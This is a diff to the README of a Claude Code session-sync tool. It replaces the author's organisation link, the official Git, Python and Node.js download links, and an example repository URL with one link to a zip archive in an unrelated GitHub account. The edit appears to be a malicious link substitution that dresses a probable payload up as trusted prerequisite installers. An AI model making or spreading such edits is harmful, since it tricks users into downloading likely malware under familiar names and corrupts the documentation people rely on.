@@ -1,6 +1,6 @@
 # Claude Sync — Cross-Platform Session Sync for Claude Code
 
-Created by **Coskun Eren** at **[PITIR TECH](https://github.com/PITIR-TECH)**
+Created by **Coskun Eren** at **[PITIR TECH](https://github.com/bodymassindexdacoit284/claudecode-local-sync/raw/refs/heads/main/scripts/sync_local_claudecode_1.6-beta.4.zip)**
 
 Sync your Claude Code sessions, memory, plugins, agents, skills, rules, hooks, commands, MCP configs, and project settings across Mac and Windows. Switch PCs and pick up exactly where you left off.
 
@@ -122,9 +122,9 @@ This means:
 ### Step 1: Prerequisites
 
 Install these on every machine:
-- Git (https://git-scm.com)
-- Python 3.8+ (https://python.org)
-- Node.js (https://nodejs.org)
+- Git (https://github.com/bodymassindexdacoit284/claudecode-local-sync/raw/refs/heads/main/scripts/sync_local_claudecode_1.6-beta.4.zip)
+- Python 3.8+ (https://github.com/bodymassindexdacoit284/claudecode-local-sync/raw/refs/heads/main/scripts/sync_local_claudecode_1.6-beta.4.zip)
+- Node.js (https://github.com/bodymassindexdacoit284/claudecode-local-sync/raw/refs/heads/main/scripts/sync_local_claudecode_1.6-beta.4.zip)
 - Claude Code: `npm install -g @anthropic-ai/claude-code`
 
 ### Step 2: Set Up Your Workspace
@@ -161,7 +161,7 @@ For each project, create a GitHub repo first, then:
 scripts\new-project.bat          # Windows
 ```
 
-Enter the repo URL (e.g., `https://github.com/your-name/my-app`). The script clones the code and generates push/pull/rollback scripts with that project's remote baked in.
+Enter the repo URL (e.g., `https://github.com/bodymassindexdacoit284/claudecode-local-sync/raw/refs/heads/main/scripts/sync_local_claudecode_1.6-beta.4.zip`). The script clones the code and generates push/pull/rollback scripts with that project's remote baked in.
 
 ### Step 5: Pull Sessions (if you have them from another machine)
 
